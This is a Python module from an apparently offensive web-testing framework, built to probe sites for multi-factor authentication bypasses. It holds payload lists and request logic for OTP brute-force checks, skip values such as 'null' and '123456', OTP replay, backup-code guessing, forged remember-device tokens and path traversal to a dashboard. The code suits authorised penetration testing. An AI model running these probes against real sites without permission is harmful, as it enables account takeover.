#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v11.0 — 2FA/MFA Bypass Module
===============================================

Tests for Multi-Factor Authentication bypass vulnerabilities:
  - TOTP brute force (6-digit codes with rate-limit detection)
  - Backup/recovery code enumeration
  - MFA skip via parameter manipulation
  - Response manipulation bypass
  - Remember-device token reuse
  - OTP reuse (replay attack)
  - Missing MFA enforcement on alternative endpoints

Enabled with: ``--mfa-bypass``
"""

from __future__ import annotations

import itertools
import re
import time
import urllib.parse
from typing import TYPE_CHECKING, List, Optional

from modules.base import BaseModule

if TYPE_CHECKING:
    pass


class MFABypassModule(BaseModule):
    """2FA / MFA bypass testing module."""

    name = "2FA/MFA Bypass"
    vuln_type = "mfa_bypass"

    # Common MFA endpoint path fragments
    MFA_PATHS = [
        "/mfa", "/2fa", "/otp", "/verify", "/confirm",
        "/authenticate", "/auth/otp", "/auth/2fa", "/auth/mfa",
        "/login/verify", "/login/otp", "/login/2fa",
        "/account/verify", "/account/mfa",
        "/totp", "/sms", "/email-otp",
    ]

    # Parameters that represent OTP/2FA codes
    OTP_PARAMS = [
        "otp", "code", "token", "mfa_code", "totp_code",
        "verification_code", "2fa_code", "otp_code", "pin",
        "passcode", "auth_code",
    ]

    # Backup code patterns
    BACKUP_CODE_PATTERNS = [
        r"backup.?code", r"recovery.?code", r"emergency.?code",
        r"one.?time.?code", r"recovery.?key",
    ]

    # MFA skip payloads (parameter manipulation)
    MFA_SKIP_PAYLOADS = [
        "true",
        "1",
        "skip",
        "bypass",
        "",
        "null",
        "undefined",
        "000000",
        "123456",
        "999999",
    ]

    def test(self, url: str, method: str, param: str, value: str) -> None:
        """Test a parameter for MFA bypass vulnerabilities."""
        param_lower = param.lower()

        if any(otp in param_lower for otp in self.OTP_PARAMS):
            self._test_otp_brute(url, method, param)
            self._test_otp_skip(url, method, param)
            self._test_otp_replay(url, method, param, value)

        if any(
            re.search(pattern, param_lower)
            for pattern in self.BACKUP_CODE_PATTERNS
        ):
            self._test_backup_code_enum(url, method, param)

        if "remember" in param_lower or "trusted" in param_lower:
            self._test_remember_device(url, method, param, value)

    def test_url(self, url: str) -> None:
        """URL-level MFA endpoint detection and testing."""
        parsed = urllib.parse.urlparse(url)
        path = parsed.path.lower()

        for mfa_path in self.MFA_PATHS:
            if mfa_path in path:
                self._test_mfa_endpoint(url)
                break

    # ------------------------------------------------------------------
    # Test implementations
    # ------------------------------------------------------------------

    def _test_otp_brute(self, url: str, method: str, param: str):
        """Attempt rate-limit detection for OTP brute force."""
        # Probe with a few incorrect codes to detect rate limiting
        probe_codes = ["000000", "111111", "222222", "333333", "444444"]
        rate_limited = False
        last_status = None

        for code in probe_codes[:3]:
            test_url = self._replace_param(url, param, code)
            resp = self.requester.request(test_url, method)
            if resp:
                if resp.status_code == 429:
                    rate_limited = True
                    break
                last_status = resp.status_code

        if not rate_limited:
            # No rate limiting detected → brute force may be feasible
            self._emit_signal(
                vuln_type="mfa_bypass",
                technique="MFA Brute Force — No Rate Limiting Detected",
                url=url,
                method=method,
                param=param,
                payload="000000-444444 (probes)",
                evidence_text=(
                    f"Multiple OTP attempts accepted without 429 response. "
                    f"Last status: {last_status}"
                ),
                raw_confidence=0.65,
                severity="HIGH",
                cvss=7.5,
            )

    def _test_otp_skip(self, url: str, method: str, param: str):
        """Test for MFA skip via parameter manipulation."""
        for payload in self.MFA_SKIP_PAYLOADS[:5]:
            test_url = self._replace_param(url, param, payload)
            resp = self.requester.request(test_url, method)
            if not resp:
                continue

            body = getattr(resp, "text", "")
            # Success indicators: redirect to dashboard, success message, session cookie set
            if self._looks_like_success(resp, body):
                self._emit_signal(
                    vuln_type="mfa_bypass",
                    technique="MFA Bypass — Skip via Parameter Manipulation",
                    url=test_url,
                    method=method,
                    param=param,
                    payload=payload,
                    evidence_text=body[:300],
                    raw_confidence=0.80,
                    severity="CRITICAL",
                    cvss=9.8,
                )
                break

    def _test_otp_replay(self, url: str, method: str, param: str, original_code: str):
        """Test whether a previously used OTP can be replayed."""
        if not original_code or not re.match(r"^\d{4,8}$", original_code):
            return

        # Send the same code twice
        for _ in range(2):
            test_url = self._replace_param(url, param, original_code)
            resp = self.requester.request(test_url, method)
            time.sleep(0.2)

        if resp and self._looks_like_success(resp, getattr(resp, "text", "")):
            self._emit_signal(
                vuln_type="mfa_bypass",
                technique="MFA OTP Replay Attack",
                url=url,
                method=method,
                param=param,
                payload=original_code,
                evidence_text="Same OTP accepted on second submission",
                raw_confidence=0.75,
                severity="HIGH",
                cvss=7.5,
            )

    def _test_backup_code_enum(self, url: str, method: str, param: str):
        """Test for backup code enumeration (short codes, sequential)."""
        test_codes = ["12345678", "00000000", "11111111", "ABCDEF12"]
        for code in test_codes:
            test_url = self._replace_param(url, param, code)
            resp = self.requester.request(test_url, method)
            if resp and self._looks_like_success(resp, getattr(resp, "text", "")):
                self._emit_signal(
                    vuln_type="mfa_bypass",
                    technique="MFA Backup Code Enumeration",
                    url=url,
                    method=method,
                    param=param,
                    payload=code,
                    evidence_text="Backup code accepted",
                    raw_confidence=0.80,
                    severity="HIGH",
                    cvss=7.5,
                )
                break

    def _test_remember_device(self, url: str, method: str, param: str, value: str):
        """Test if remember-device tokens can be reused or forged."""
        # Try with a known weak/predictable remember token
        for fake_token in ("true", "1", "admin", "remember"):
            test_url = self._replace_param(url, param, fake_token)
            resp = self.requester.request(test_url, method)
            if resp and self._looks_like_success(resp, getattr(resp, "text", "")):
                self._emit_signal(
                    vuln_type="mfa_bypass",
                    technique="MFA Remember-Device Token Forgery",
                    url=url,
                    method=method,
                    param=param,
                    payload=fake_token,
                    evidence_text="Forged remember-device token accepted",
                    raw_confidence=0.75,
                    severity="HIGH",
                    cvss=7.3,
                )
                break

    def _test_mfa_endpoint(self, url: str):
        """Test if MFA endpoint can be accessed without prior authentication."""
        resp = self.requester.request(url, "GET")
        if not resp:
            return
        body = getattr(resp, "text", "")

        # If we get the MFA form without being authenticated
        if resp.status_code == 200 and any(
            keyword in body.lower()
            for keyword in ("enter code", "verification code", "otp", "authenticator")
        ):
            # Check if skipping MFA entirely works
            skip_url = url.rstrip("/") + "/../dashboard"
            skip_resp = self.requester.request(skip_url, "GET")
            if skip_resp and skip_resp.status_code == 200:
                self._emit_signal(
                    vuln_type="mfa_bypass",
                    technique="MFA Enforcement Missing — Direct Dashboard Access",
                    url=skip_url,
                    method="GET",
                    param="",
                    payload="path traversal to /dashboard",
                    evidence_text=f"Dashboard accessible without completing MFA: {skip_url}",
                    raw_confidence=0.70,
                    severity="HIGH",
                    cvss=8.1,
                )

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _looks_like_success(self, resp, body: str) -> bool:
        """Heuristic: does this response indicate a successful auth?"""
        if resp.status_code == 302:
            loc = resp.headers.get("location", "").lower() if hasattr(resp, "headers") else ""
            return any(word in loc for word in ("dashboard", "home", "account", "profile", "welcome"))
        body_lower = body.lower()
        success_signals = ["welcome", "dashboard", "logged in", "authenticated", "success"]
        fail_signals = ["invalid code", "incorrect", "error", "expired", "failed"]
        has_success = any(s in body_lower for s in success_signals)
        has_fail = any(s in body_lower for s in fail_signals)
        return has_success and not has_fail

    def _replace_param(self, url: str, param: str, new_value: str) -> str:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [new_value]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
